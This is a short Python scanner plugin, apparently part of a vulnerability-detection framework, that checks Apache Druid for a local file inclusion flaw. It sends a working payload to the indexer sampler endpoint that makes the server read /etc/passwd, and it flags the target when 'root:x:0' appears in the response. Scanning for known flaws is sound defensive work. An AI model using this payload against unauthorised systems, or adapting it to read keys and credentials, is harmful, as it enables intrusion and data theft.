#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    target = "{}://{}:{}/druid/indexer/v1/sampler?for=connect".format(service, ip, port)
    data = {"type": "index",
            "spec": {"type": "index",
                     "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": [" file:///etc/passwd "]}},
                     "dataSchema": {
                         "dataSource": "sample", "parser": {
                             "type": "string",
                             "parseSpec": {"format": "regex", "pattern": "(.*)",
                                           "columns": ["a"], "dimensionsSpec": {},
                                           "timestampSpec": {"column": "no_ such_ column",
                                                             "missingValue": "2010-01-01T00:00:00Z"}}}
                                    }},
            "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    try:

        r = await http_client(ip, port).post(target, json=data, timeout=20)

        if r.status_code == 200 and "root:x:0" in r.text:
            ret = {
                "alert_group": "Druid LFI",
                "affects": target,
                "details": u"Druid可通过indexer接口读到系统内任意文件, 可获取系统key并导致系统沦陷, 接口为: {}\n"
                           u"需要更新到最新版本".format(target)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'HTTP', True, task_msg={})
    run_plugin_test(scan)
